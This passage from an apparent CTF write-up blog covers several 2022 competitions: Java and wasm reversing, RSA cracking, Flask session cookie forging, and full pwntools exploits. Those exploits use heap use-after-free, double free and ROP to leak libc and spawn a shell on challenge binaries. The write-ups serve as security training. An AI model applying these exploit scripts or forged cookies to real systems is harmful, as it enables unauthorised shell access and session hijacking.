t_helper(n - 3, array); } public static int t(final int n) { final int[] array = new int[n + 1]; for (int i = 0; i \u003c array.length; ++i) { array[i] = -1; } return t_helper(n, array); } public static void main(final String[] array) { if (array.length != 1) { System.out.println(\"Usage: [flag]\"); return; } if (check(array[0])) { System.out.println(\"Correct!\"); } else { System.out.println(\"Incorrect\"); } } public static long[] conv(final String s) { final long[] array = new long[s.length()]; for (int i = 0; i \u003c s.length(); ++i) { array[i] = (s.charAt(i) \u003c\u003c 8) + s.charAt((i + 1) % s.length()); } return array; } public static boolean check(final String s) { final long[] conv = conv(s); for (int i = 0; i \u003c conv.length; ++i) { if (Oak.data[i] != (conv[i] ^ (long)t(i * i))) { return false; } } return true; } static { Oak.data = new long[] { 28767L, 24418L, 25470L, 29771L, 26355L, 31349L, 13032L, 30456L, 14663L, 27592L, 8916L, 29409L, 7348L, 17474L, 5124L, 3345L, 49357L, 61058L, 65159L, 53773L, 67886L, 72426L, 103728L, 158125L, 179542L, 166504L, 212101L, 282674L, 320873L, 329272L, 400021L, 479881L, 535081L, 599886L, 662294L, 731441L, 831284L, 947032L, 1021482L }; } } Basically, what it do is it will compare our converted flag value with Oak.data ^ t(i*i). t(i*i value can be easily generated (Just rewrite the t function on python), so we know the value of Oak.data ^ t(i*i). Now, let’s move to the conv function. Basically, what it do is only flag[i] \u003c\u003c 8 + flag[i+1]. And because we know the first char should be p (Because the flag is started with p_ctf), we can iteratively recover the flag. Below is the solver script import sys import string sys.setrecursionlimit(2500) arr = [] for _ in range(39): arr.append(-1) data = [ 28767, 24418, 25470, 29771, 26355, 31349, 13032, 30456, 14663, 27592, 8916, 29409, 7348, 17474, 5124, 3345, 49357, 61058, 65159, 53773, 67886, 72426, 103728, 158125, 179542, 166504, 212101, 282674, 320873, 329272, 400021, 479881, 535081, 599886, 662294, 731441, 831284, 947032, 1021482 ] def t_helper(n): global arr if arr[n] != -1: return arr[n] if n == 0: arr[0] = 0 return arr[0] if n == 1: arr[1] = 1 return arr[1] if n == 2: arr[2] = 3 return arr[2] arr[n] = 3 * t_helper(n - 1) - 3 * t_helper(n - 2) + t_helper(n - 3) return arr[n] def t(n): global arr arr = [] for _ in range(39*39+1): arr.append(-1) return t_helper(n) # Generate Oak.data[i]^t(i*i) xored_data = [] for i in range(39): res = t(i*i) xored_data.append(data[i]^res) # Iteratively recover flag by assuming the first char of the flag is \"p\" flag = 'p' prev_char = 'p' for num in xored_data[:-1]: for ch in string.printable: if ((ord(prev_char) \u003c\u003c 8) + ord(ch)) == num: flag += ch prev_char = ch break print(f'Flag: {flag}') Flag: p_ctf{0r1g1n4|_n@M3-0f_J4vA_Wa5()/|\u003c} Social Media Follow me on twitter ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:9:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"On this CTF, I only managed to solve two challenges, the web-intro and cache challenge. However, I’m super happy doing this CTF because I learned a lot about heap during doing this CTF. Kudos to the organizers! Here is my writeup for those two challenges. Web ","date":"Feb 14, 2022","objectID":"/posts/defcamp-ctf-2022/:0:0","tags":["Writeup","DefCampCTF","heap","pwn","web","flask","2022"],"title":"DefCamp CTF 2022","uri":"/posts/defcamp-ctf-2022/"},{"categories":null,"content":"web-intro We were given a flask website, where it only show Access Denied. Checking the cookie, we notice it contains the session. Using flask unsign, we try to bruteforce the secret, and found it. flask-unsign --unsign --cookie eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgY8Ag.brYMgM6ScmEf9me5I0-BKia5QTs flask-unsign --sign --cookie \"{'logged_in': True}\" --secret 'password' Flag: CTF{66bf8ba5c3ee2bd230f5cc2de57c1f09f471de8833eae3ff7566da21eb141eb7} Pwn ","date":"Feb 14, 2022","objectID":"/posts/defcamp-ctf-2022/:1:0","tags":["Writeup","DefCampCTF","heap","pwn","web","flask","2022"],"title":"DefCamp CTF 2022","uri":"/posts/defcamp-ctf-2022/"},{"categories":null,"content":"Cache Disclaimer This is my first time doing heap challenge, I spend a lot of time learning while doing it, so I’m sorry if I made some mistakes during explaining my solution. Would love to have your comments or feedback if you found some misinformation in my writeup. ","date":"Feb 14, 2022","objectID":"/posts/defcamp-ctf-2022/:2:0","tags":["Writeup","DefCampCTF","heap","pwn","web","flask","2022"],"title":"DefCamp CTF 2022","uri":"/posts/defcamp-ctf-2022/"},{"categories":null,"content":"Intro We were given a libc and a binary file called vuln. Checking the given libc, we know that the glibc version is 2.27 ","date":"Feb 14, 2022","objectID":"/posts/defcamp-ctf-2022/:2:1","tags":["Writeup","DefCampCTF","heap","pwn","web","flask","2022"],"title":"DefCamp CTF 2022","uri":"/posts/defcamp-ctf-2022/"},{"categories":null,"content":"Initial analysis Here is the result of the decompilation with Ghidra void main(EVP_PKEY_CTX *param_1) { long in_FS_OFFSET; int local_24; void *student_pointer; code **admin_pointer; undefined8 local_10; local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28); student_pointer = (void *)0x0; admin_pointer = (code **)0x0; init(param_1); do { while( true ) { while( true ) { while( true ) { puts(\"MENU\"); puts(\"1: Make new admin\"); puts(\"2: Make new user\"); puts(\"3: Print admin info\"); puts(\"4: Edit Student Name\"); puts(\"5: Print Student Name\"); puts(\"6: Delete admin\"); puts(\"7: Delete user\"); printf(\"\\nChoice: \"); fflush(stdout); __isoc99_scanf(\"%d%*c\",\u0026local_24); if (local_24 != 1) break; admin_pointer = (code **)malloc(0x10); admin_pointer[1] = admin_info; *admin_pointer = getFlag; } if (local_24 != 2) break; student_pointer = malloc(0x10); printf(\"What is your name: \"); fflush(stdout); read(0,student_pointer,0x10); } if (local_24 != 3) break; (*admin_pointer[1])(); } if (local_24 == 4) { printf(\"What is your name: \"); fflush(stdout); read(0,student_pointer,0x10); } else if (local_24 == 5) { if (student_pointer == (void *)0x0) { puts(\"New student has not been created yet\"); } else { printf(\"Students name is %s\\n\",student_pointer); } } else if (local_24 == 6) { free(admin_pointer); } else if (local_24 == 7) { free(student_pointer); } else { puts(\"bad input\"); } } while( true ); } Reading the decompilation result, we notice some bug. Use After Free on admin and student pointer (Because after being freed, the pointer is not set to null). Double Free due to previous bug and the glibc version We can easily call a function by calling the menu 3 (print admin info) ","date":"Feb 14, 2022","objectID":"/posts/defcamp-ctf-2022/:2:2","tags":["Writeup","DefCampCTF","heap","pwn","web","flask","2022"],"title":"DefCamp CTF 2022","uri":"/posts/defcamp-ctf-2022/"},{"categories":null,"content":"Pitfall solution To make our life easier, let’s make a wrapper in python to do that: libc = ELF('./libc.so.6') r = process('./vuln', env={}) def print_student(): r.sendlineafter(b'Choice: ', b'5') r.recvuntil(b'is ') return r.recvuntil(b'\\n').strip() def new_admin(): r.sendlineafter(b'Choice: ', b'1') def free_admin(): r.sendlineafter(b'Choice: ', b'6') def get_shell(): r.sendlineafter(b'Choice: ', b'3') r.interactive() def new_student(name): r.sendlineafter(b'Choice: ', b'2') r.sendlineafter(b': ', name) def edit_student(name): r.sendlineafter(b'Choice: ', b'4') r.sendlineafter(b': ', name) def free_student(): r.sendlineafter(b'Choice: ', b'7') Skimming the decompiled code, it seems the solution that we need is only abusing the UAF bug: Create Admin Free it (then the chunk goes to tcache because the malloc size is 0x10) Create User where the last 8 byte is the getFlag address Call Print Admin Info (Because admin_pointer and student_pointer is pointing to the same chunk, hence call Print Admin Info will call getFlag). After I did the above steps, turn out the printed flag was a fake flag. ","date":"Feb 14, 2022","objectID":"/posts/defcamp-ctf-2022/:2:3","tags":["Writeup","DefCampCTF","heap","pwn","web","flask","2022"],"title":"DefCamp CTF 2022","uri":"/posts/defcamp-ctf-2022/"},{"categories":null,"content":"Further analysis Seems like we need to trigger shell to look around for the real flag. Basically, our target is to do the above steps, but instead of putting the getFlag address, we trigger the shell. Idea explanation In order to do that, first I try to find execve(\"/bin/sh\" on the given libc with one_gadget. We found some candidates. 0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ) constraints: rsp \u0026 0xf == 0 rcx == NULL 0x4f322 execve(\"/bin/sh\", rsp+0x40, environ) constraints: [rsp+0x40] == NULL 0x10a38c execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL To use that gadget, we need to leak libc base address. In order to do that, we can’t rely on the tcache bin. We need to find a way, so that during we call the free, the chunk got cached inside unsortedbin, because unsorted bin chunk will store pointer to libc main_arena. With UAF, we can leak the libc base address. How to do that? The main idea is we need to: Forge a chunk with size 0x90 Free it 7 times (So that tcache[0x90] will be full) Free it one more time. And then our chunk will go to unsortedbin (If we use size smaller than 0x90, it will go to fastbin) Using UAF, we can print the chunk data (which contains the libc address of the main_arena) Reuse the pitfall solution, but instead of getFlag address, we store our shell gadget address Let’s do that 😄 Leak heap address In order to fulfill that, we need to find the heap_address first. We can use double free to retrieve the heap address: Create new student Free it (our chunk will go to tcache, and tcache_entry-\u003enext is null) Free it again (Because we free the same chunk, the single linked list of tcache_entry will create a loop. The tcache[0x20] will be like thisstudent_pointer-\u003estudent_pointer-\u003e...) # Leak heap address by double-free new_student(b'a'*0x10) for i in range(2): # Double free free_student() out = print_student() heap_address = u64(out.ljust(8, b'\\x00')) log.info(f'Leak heap address: {hex(heap_address)}') Heap after creating new student named aaaaaaaaaaaaaaaa pwndbg\u003e x/30gx 0x21a0260-0x10 0x21a0250: 0x0000000000000000 0x0000000000000021 \u003c- chunk size metadata 0x21a0260: 0x6161616161616161 0x6161616161616161 \u003c- chunk data 0x21a0270: 0x0000000000000000 0x0000000000020d91 0x21a0280: 0x0000000000000000 0x0000000000000000 0x21a0290: 0x0000000000000000 0x0000000000000000 0x21a02a0: 0x0000000000000000 0x0000000000000000 0x21a02b0: 0x0000000000000000 0x0000000000000000 0x21a02c0: 0x0000000000000000 0x0000000000000000 0x21a02d0: 0x0000000000000000 0x0000000000000000 0x21a02e0: 0x0000000000000000 0x0000000000000000 0x21a02f0: 0x0000000000000000 0x0000000000000000 0x21a0300: 0x0000000000000000 0x0000000000000000 0x21a0310: 0x0000000000000000 0x0000000000000000 0x21a0320: 0x0000000000000000 0x0000000000000000 0x21a0330: 0x0000000000000000 0x0000000000000000 First free pwndbg\u003e x/30gx 0x21a0260-0x10 0x21a0250: 0x0000000000000000 0x0000000000000021 0x21a0260: 0x0000000000000000 0x6161616161616161 \u003c- This chunk become tcache_entry, and the first 8 bytes point to the next tcache_entry, which is null because only 1 entry for now 0x21a0270: 0x0000000000000000 0x0000000000020d91 0x21a0280: 0x0000000000000000 0x0000000000000000 0x21a0290: 0x0000000000000000 0x0000000000000000 0x21a02a0: 0x0000000000000000 0x0000000000000000 0x21a02b0: 0x0000000000000000 0x0000000000000000 0x21a02c0: 0x0000000000000000 0x0000000000000000 0x21a02d0: 0x0000000000000000 0x0000000000000000 0x21a02e0: 0x0000000000000000 0x0000000000000000 0x21a02f0: 0x0000000000000000 0x0000000000000000 0x21a0300: 0x0000000000000000 0x0000000000000000 0x21a0310: 0x0000000000000000 0x0000000000000000 0x21a0320: 0x0000000000000000 0x0000000000000000 0x21a0330: 0x0000000000000000 0x0000000000000000 Free it again pwndbg\u003e x/30gx 0x21a0260-0x10 0x21a0250: 0x0000000000000000 0x0000000000000021 0x21a0260: 0x00000000021a0260 0x6161616161616161 \u003c- Because of the double free, the tcache_entry single linked list create a loop 0x21a0270: 0x0000000000000000 0x000000000","date":"Feb 14, 2022","objectID":"/posts/defcamp-ctf-2022/:2:4","tags":["Writeup","DefCampCTF","heap","pwn","web","flask","2022"],"title":"DefCamp CTF 2022","uri":"/posts/defcamp-ctf-2022/"},{"categories":null,"content":"Full Solution from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") ''' 1 malloc(admin) 2 malloc(student) 3 call admin[1] 4 edit student 5 print student 6 free admin 7 free student ''' libc = ELF('./libc.so.6') r = process('./vuln_patched', env={}) # r = remote('34.159.7.96', 32552) def print_student(): r.sendlineafter(b'Choice: ', b'5') r.recvuntil(b'is ') return r.recvuntil(b'\\n').strip() def new_admin(): r.sendlineafter(b'Choice: ', b'1') def free_admin(): r.sendlineafter(b'Choice: ', b'6') def get_shell(): r.sendlineafter(b'Choice: ', b'3') r.interactive() def new_student(name): r.sendlineafter(b'Choice: ', b'2') r.sendlineafter(b': ', name) def edit_student(name): r.sendlineafter(b'Choice: ', b'4') r.sendlineafter(b': ', name) def free_student(): r.sendlineafter(b'Choice: ', b'7') # Leak heap address by double-free new_student(b'a'*0x10) for i in range(2): # Double free free_student() out = print_student() heap_address = u64(out.ljust(8, b'\\x00')) log.info(f'Leak heap address: {hex(heap_address)}') # Set tcache[0x20] to empty edit_student(p64(0)) # Make the current tcache_entry-\u003enext to null new_student(b'a'*8) # The malloc will use the cached chunk, and because the next is null, tcache[0x20] is now empty # Populate heap because we will forge the chunk to 0x90 size (1 alloc = 0x20 bytes) # Make sure the next of our forged chunk is not the wilderness for i in range(6): new_student(p64(0) + p64(0x91)) # Free the last chunk # Overwrite it with our desired address (heap_address + 0x30) free_student() edit_student(p64(heap_address+0x30)) # tcache[0x20] = last_chunk-\u003eheap_address+0x30 new_student(b'a'*8) # Allocate it to last chunk. Now, tcache[0x20] = heap_address+0x30 new_student(b'a'*8) # Allocate it to heap_address+0x30. Now, tcache[0x20] = empty and student pointer point to heap_address+0x30 for i in range(7): free_student() # Free it 7 times to fulfill tcache[0x90] # Because tcache[0x90] is full, the next free will put the cached chunk into unsorted bins free_student() # Cache goes to unsorted bins, and its pointer will point to the main_arena # Now our pointer is pointing to the main_arena. We can leak the libc address by using the print menu, # because the student variable is still a pointer to the freed chunk out = print_student() main_arena = libc.symbols['main_arena'] libc_leaked = u64(out.ljust(8, b'\\x00')) # We got main_arena+0x60 libc_base = libc_leaked - main_arena - 0x60 log.info(f'Leak libc base address: {hex(libc_base)}') libc_shell = 0x10a38c # one_gadget shell_addr = libc_base + libc_shell new_admin() # Create new admin free_admin() # Free it new_student(p64(0)+p64(shell_addr)) # Create new student # Because of the tcache, now variable admin and student are pointing to the same chunk, # and the chunk data (last 8 bytes) that can be called by the admin is our shell_addr get_shell() Social Media Follow me on twitter ","date":"Feb 14, 2022","objectID":"/posts/defcamp-ctf-2022/:2:5","tags":["Writeup","DefCampCTF","heap","pwn","web","flask","2022"],"title":"DefCamp CTF 2022","uri":"/posts/defcamp-ctf-2022/"},{"categories":null,"content":"This CTF is quite fun because I got the chance to learn more about wasm. Here is my writeup for challenges that I solved during working on it. Web ","date":"Feb 07, 2022","objectID":"/posts/dicectf-2022/:0:0","tags":["Writeup","DiceCTF","web","rsa","crypto","wasm","pwn","rop","format string","2022"],"title":"DiceCTF 2022","uri":"/posts/dicectf-2022/"},{"categories":null,"content":"knock-knock We were given source code like below. const crypto = require('crypto'); class Database { constructor() { this.notes = []; this.secret = `secret-${crypto.randomUUID}`; } createNote({ data }) { const id = this.notes.length; this.notes.push(data); return { id, token: this.generateToken(id), }; } getNote({ id, token }) { if (token !== this.generateToken(id)) return { error: 'invalid token' }; if (id \u003e= this.notes.length) return { error: 'note not found' }; return { data: this.notes[id] }; } generateToken(id) { return crypto .createHmac('sha256', this.secret) .update(id.toString()) .digest('hex'); } } const db = new Database(); db.createNote({ data: process.env.FLAG }); const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: false })); app.use(express.static('public')); app.post('/create', (req, res) =\u003e { const data = req.body.data ?? 'no data provided.'; const { id, token } = db.createNote({ data: data.toString() }); res.redirect(`/note?id=${id}\u0026token=${token}`); }); app.get('/note', (req, res) =\u003e { const { id, token } = req.query; const note = db.getNote({ id: parseInt(id ?? '-1'), token: (token ?? '').toString(), }); if (note.error) { res.send(note.error); } else { res.send(note.data); } }); app.listen(3000, () =\u003e { console.log('listening on port 3000'); }); The bug is on the secret generation, where they forgot to put (), hence the secret is always the same (because crypto.randomUUID value will be constant, consist of the function implementation). We only need to run the docker, and we will be able to get the correct token for the note id 0/ Flag: dice{1_d00r_y0u_d00r_w3_a11_d00r_f0r_1_d00r} Pwn ","date":"Feb 07, 2022","objectID":"/posts/dicectf-2022/:1:0","tags":["Writeup","DiceCTF","web","rsa","crypto","wasm","pwn","rop","format string","2022"],"title":"DiceCTF 2022","uri":"/posts/dicectf-2022/"},{"categories":null,"content":"interview-opportunity We were given a binary file and libc file. Using Ghidra, we can see the decompiled code. undefined8 main(undefined4 param_1,undefined8 param_2) { char local_22 [10]; undefined8 local_18; undefined4 local_c; local_18 = param_2; local_c = param_1; env_setup(); printf( \"Thank you for you interest in applying to DiceGang. We need great pwners like you to contin ue our traditions and competition against perfect blue.\\n\" ); printf(\"So tell us. Why should you join DiceGang?\\n\"); read(0,local_22,0x46); puts(\"Hello: \"); puts(local_22); return 0; } There is buffer overflow bug. We just need to leak the base address, and then ROP the binary to execve address (that we found from the help of one_gadget). Below is the full solution from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") main = 0x401240 puts_plt = 0x401030 puts_got = 0x404018 execve = 0xcbd20 # rsi null, rdi null pop_rdi = p64(0x0000000000401313) # pop rdi; ret; pop_rsi_r15 = p64(0x0000000000401311) # pop rsi; pop r15; ret; payload = b'a'*(0x1a+8) payload += pop_rdi + p64(puts_got) payload += p64(puts_plt) payload += p64(main) r = remote('mc.ax', 31081) log.info(r.readrepeat(1)) r.sendline(payload) log.info(r.recvuntil(b'\\n')) log.info(r.recvuntil(b'\\n')) puts_addr = u64(r.recvline().strip().ljust(8, b'\\x00')) base_addr = puts_addr - 0x00000000000765f0 # readelf -s libc.so.6| grep \"puts\" print(f'Puts addr: {hex(puts_addr)}') print(f'Base addr: {hex(base_addr)}') log.info(r.readrepeat(1)) payload = b'a'*(0x1a+8) payload += pop_rsi_r15 + p64(0) + p64(0) payload += p64(base_addr + execve) r.sendline(payload) r.interactive() Flag: dice{0ur_f16h7_70_b347_p3rf3c7_blu3_5h4ll_c0n71nu3} Rev ","date":"Feb 07, 2022","objectID":"/posts/dicectf-2022/:2:0","tags":["Writeup","DiceCTF","web","rsa","crypto","wasm","pwn","rop","format string","2022"],"title":"DiceCTF 2022","uri":"/posts/dicectf-2022/"},{"categories":null,"content":"flagle Flagle interface We were given a wasm file which is a similar app to wordle. We need to find what is the correct words (the total words are 6). We can compile the wasm file into binary, and open it with Ghidra. After reading the decompiled, there are 5 functions on the wasm, validate_1, validate_2, validate_3, validate_5, validate_6. Each function will be used to validate each word. Below is the source code undefined4 export::validate_1(undefined4 param1) { undefined4 uVar1; uVar1 = streq(param1,0x400); return uVar1; } 0x400: ram:00000400 64 ?? 64h d ram:00000401 69 ?? 69h i ram:00000402 63 ?? 63h c ? -\u003e ram:007b6563 ram:00000403 65 ?? 65h e ? -\u003e ram:00007b65 ram:00000404 7b ?? 7Bh { ? -\u003e ram:0000007b From the above code, we know that the first word is dice{ uint export::validate_2(undefined4 param1,undefined4 param2,undefined4 param3,undefined4 param4, int param5) { uint uVar1; uVar1 = 0; if ((((char)param3 == '3') \u0026\u0026 ((char)param4 == 'l')) \u0026\u0026 ((char)param2 == '!')) { uVar1 = (uint)(param5 == L'D' \u0026\u0026 (char)param1 == 'F'); } return uVar1; } From the above code, we know that the second word is F!3lD uint export::validate_3(int param1,int param2,int param3,int param4,int param5) { uint uVar1; uVar1 = 0; if ((((param2 * param1 == 0x12c0) \u0026\u0026 (param3 + param1 == 0xb2)) \u0026\u0026 (param3 + param2 == 0x7e)) \u0026\u0026 ((param4 * param3 == 0x23a6 \u0026\u0026 (param4 - param5 == 0x3e)))) { uVar1 = (uint)(param3 * 0x12c0 - param5 * param4 == 0x59d5d); } return uVar1; } From the above code, we can easily brute-force to find the correct word. Result is d0Nu7 From the above image, we can see the implementation of validate_4. Below is the javascript method that is used to validate the fourth word. function c(b) { var e = { 'HLPDd': function(g, h) { return g === h; }, 'tIDVT': function(g, h) { return g(h); }, 'QIMdf': function(g, h) { return g - h; }, 'FIzyt': 'int', 'oRXGA': function(g, h) { return g \u003c\u003c h; }, 'AMINk': function(g, h) { return g \u0026 h; } } , f = current_guess; try { let g = e['HLPDd'](btoa(e['tIDVT'](intArrayToString, window[b](b[e['QIMdf'](f, 0x26f4 + 0x1014 + -0x3707 * 0x1)], e['FIzyt'])()['toString'](e['oRXGA'](e['AMINk'](f, -0x1a3 * -0x15 + 0x82e * -0x1 + -0x1a2d), 0x124d + -0x1aca + 0x87f))['match'](/.{2}/g)['map'](h=\u003eparseInt(h, f * f)))), 'ZGljZQ==') ? -0x1 * 0x1d45 + 0x2110 + -0x3ca : -0x9 * 0x295 + -0x15 * -0x3 + 0x36 * 0x6d; } catch { return 0x1b3c + -0xc9 * 0x2f + -0x19 * -0x63; } } The simplified version psuedocode is below our_input = b; f = current_guess; intArrayToString(window[our_input](our_input[f-1], 'int')().toString((f \u0026 4) \u003c\u003c 2)).match(/.{2}/g).map(h=\u003eparseInt(h, f*f)) === \"dice{\" Deduction from the function: f value should be 4, so that toString() radix argument and parseInt radix argument both will be 16, which is hexadecimal representation. From our deduction, we can conclude that basically, what it do is: our_input will be a string which is one of the fields of window object, where the field length is 5 char The result of the call will be converted toString(16), which is hex, split it per two, and then convert the hex to integer. The result should be dice{ To get the fourth word, what I do is try it one by one all fields in the Window object which has length 5 char. After some bruteforcing, I found that the correct field is cwrap, which will be our fourth word. uint export::validate_5(undefined4 param1,undefined4 param2,undefined4 param3,undefined4 param4, int param5) { uint uVar1; uVar1 = 0; if ((((char)param1 == 'm') \u0026\u0026 ((char)param2 == '@')) \u0026\u0026 ((char)param3 == 'x')) { uVar1 = (uint)(param5 == 0x4d \u0026\u0026 (char)param4 == '!'); } return uVar1; } We can see that the fifth word is m@x!M uint export::validate_6(int param1,int param2,int param3,int param4,int param5) { uint uVar1; uVar1 = 0; if ((param2 + 0xb75) * (param1 + 0x6e3) == 0x53acdf) { uVar1 = (uint)(param5 == 0x7d \u0026\u0026 (param4 + 0x60a) * (param3 + 0xf49) == 0x62218f); } return uVar1; } With some bruteforcing, we can found that the sixth word is T$r3}. Finally, we re","date":"Feb 07, 2022","objectID":"/posts/dicectf-2022/:3:0","tags":["Writeup","DiceCTF","web","rsa","crypto","wasm","pwn","rop","format string","2022"],"title":"DiceCTF 2022","uri":"/posts/dicectf-2022/"},{"categories":null,"content":"baby-rsa We were given this file from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes def getAnnoyingPrime(nbits, e): while True: p = getPrime(nbits) if (p-1) % e**2 == 0: return p nbits = 128 e = 17 p = getAnnoyingPrime(nbits, e) q = getAnnoyingPrime(nbits, e) flag = b\"dice{???????????????????????}\" N = p * q cipher = pow(bytes_to_long(flag), e, N) print(f\"N = {N}\") print(f\"e = {e}\") print(f\"cipher = {cipher}\") ''' N = 57996511214023134147551927572747727074259762800050285360155793732008227782157 e = 17 cipher = 19441066986971115501070184268860318480501957407683654861466353590162062492971 ''' Reading the code, $N$ is small enough, so that we can easily factor it (with factordb). After we retrieve $p$ and $q$, we found out that $GCD(e, phi) = 17$, which mean there exists multiple solution to the RSA equation. However, $GCD(e, phi)$ is small enough, where we can easily find the $nth_root$ of the $cipher$. After retrieving the possible solutions, we just need to check which one contains dice{ on it. Below is the solution. from pwn import * from Crypto.Util.number import * n = 57996511214023134147551927572747727074259762800050285360155793732008227782157 e = 17 c = 19441066986971115501070184268860318480501957407683654861466353590162062492971 # n is small, so it is easy to factor it p = 172036442175296373253148927105725488217 q = 337117592532677714973555912658569668821 phi = (p-1)*(q-1) # After analysis, GCD(e, phi) is 17. The solution is small enough to be factored with nth_root, # where one of the root will be our flag for m in Mod(c, n).nth_root(gcd(e, phi), all=True): flag = long_to_bytes(m) if b'dice' in flag: print(b'Flag: {flag.decode()}') exit() Flag: dice{cado-and-sage-say-hello} Social Media Follow me on twitter ","date":"Feb 07, 2022","objectID":"/posts/dicectf-2022/:4:0","tags":["Writeup","DiceCTF","web","rsa","crypto","wasm","pwn","rop","format string","2022"],"title":"DiceCTF 2022","uri":"/posts/dicectf-2022/"},{"categories":null,"content":" I’m super happy on writing this writeup becaue I managed to qualify to join the final of GCC 3.0 2022. Here is my writeup for challenges that I solved during qualification. (Edit: I got third place on the final :D). Rev ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:0:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"Regexp Challenge We just need to craft manually our regex per level Level 1 \\d{8}\\D{1} Level 2 ^[1,2,3,4,8,9]\\D{1} Level 3 \\d{8}[A]{1} Level 4 7{7,}[A] Level 5 .*A Level 6 \\d*A Level 7 \\d*\\D Level 8 \\d*[c,h,W,A] Level 9 [^-]+ Level 10 \\D{1}-{1}\\d{6}\\D Level 11 \\D{1}-{1}\\d{3,5}\\D Level 12 \\D{1}(-|\\+){1}\\d{6}\\D Level 13 \\d{2}\\D?\\d{5}\\D Level 14 \\d{2}\\D?\\d{1,3}\\D Level 15 ((\\D\\+\\d{4,6}\\D)|(\\D-\\d{4}\\D)) Flag: HL{RegExp-Tyc00n-91234} ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:1:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"License Key Level 1 Serial key was found in this verify function Flag: SYIOKLELUIOD ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:2:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"License Key Level 2 The calculated serial was printed in the terminal, so we can simply use it as the flag. Flag: LBQXULNJPXDE ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:3:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"License Key Level 3 Checking the disassembly code From the above image, we found the key From the above image, we found the logic to generate the serial Just translate it into python key = b'yrtxgfh;olmn' name = b'cyberpeace' serial = '' for i in range(12): serial += chr(((key[(i*2) % 12]^name[i % len(name)]) \u003c\u003c 2) % 0x19 + ord('B')) print(serial) Flag: FDVDRRNKRDYG ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:4:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"License Key Level 4 After reading the disassembly code, we know that the serial char comparison happens at this address 40752d: 44 38 2c 18 cmp BYTE PTR [rax+rbx*1],r13b With the help of GDB, we can simply set breakpoints on it, and retrieve the r13 value. We got our serial key after retrieving the r13 value 12 times. Flag: GEIJBLDJDECA ","date":"Jan 11, 2022","objectID":"/posts/gcc-3.0-ctf-2022/:5:0","tags":["Writeup","GCC CTF","jsp","web","pwn","android","short-pwn","rop","got overwrite","2022"],"title":"GCC 3.0 CTF 2022","uri":"/posts/gcc-3.0-ctf-2022/"},{"categories":null,"content":"Crack me Android I got an apk file, and I try to decompile it with the help of JDK. After reading the result I found the login code in the LoginViewModel. public void login(String str) { if (checkHooking()) { this.loginResult.setValue(new LoginResult(Integer.valueOf((int) R.string.must_not_hook))); return; } try { int[] checkPw = checkPw(getCode(str)); if (checkPw.length \u003e 0) { this.loginResult.setValue(new LoginResult(new LoggedInUser(getStringFromCode(checkPw), \"Well done you did it.\"))); } else { this.loginResult.setValue(new LoginResult(Integer.valueOf((int) R.string.login_failed))); } } catch (Exception unused) { this.loginResult.setValue(new LoginResult(Integer.valueOf((int) R.string.error_logging_in))); } } protected static int[] x0 = {121, 134, 239, 213, 16, 28, 184, 101, 150, 60, 170, 49, 159, 189, 241, 146, 141, 22, 205, 223, 218, 210, 99, 219, 34, 84, 156, 237, 26, 94, 178, 230, 27, 180, 72, 32, 102, 192, 178, 234, 228, 38, 37, 142, 242, 142, 133, 159, 142, 33}; protected int[] getCode(String str) { byte[] bytes = str.getBytes(); int[] iArr = new int[str.length()]; for (int i = 0; i \u003c str.length(); i++) { iArr[i] = bytes[i] ^ x0[i]; } return iArr; } Basically, what it do is our password will be xor-ed with the x0 var, and then the result will be passed to native method called checkPw I extract the native lib so file, and open it on Ghidra. With the help of JNIAnalyzer, I could deduce the password checker that was used in the checkPw method. jintArray Java_org_bfe_crackmenative_ui_LoginViewModel_checkPw (JNIEnv *env,jobject thiz,jintArray password) { bool bVar1; bool bVar2; jintArray new_arr; jsize password_length; FILE *__stream; char *pcVar3; jint *curr_char_pass; char expected_char; long idx; jintArray new_arr5; long in_FS_OFFSET; char local_1038 [4096]; long local_38; local_38 = *(long *)(in_FS_OFFSET + 0x28); __android_log_write(4,\"Native Check\",\"Checking password ...\"); new_arr = (*(*env)-\u003eNewIntArray)(env,0); password_length = (*(*env)-\u003eGetArrayLength)(env,password); new_arr5 = new_arr; if ((int)password_length == 27) { __stream = fopen(\"/proc/self/maps\",\"r\"); do { pcVar3 = fgets(local_1038,0x1000,__stream); if (pcVar3 == (char *)0x0) { bVar1 = false; bVar2 = bVar1; if (__stream == (FILE *)0x0) goto LAB_001009f9; goto LAB_001009f1; } pcVar3 = strstr(local_1038,\"Xposed\"); bVar1 = true; } while ((pcVar3 == (char *)0x0) \u0026\u0026 (pcVar3 = 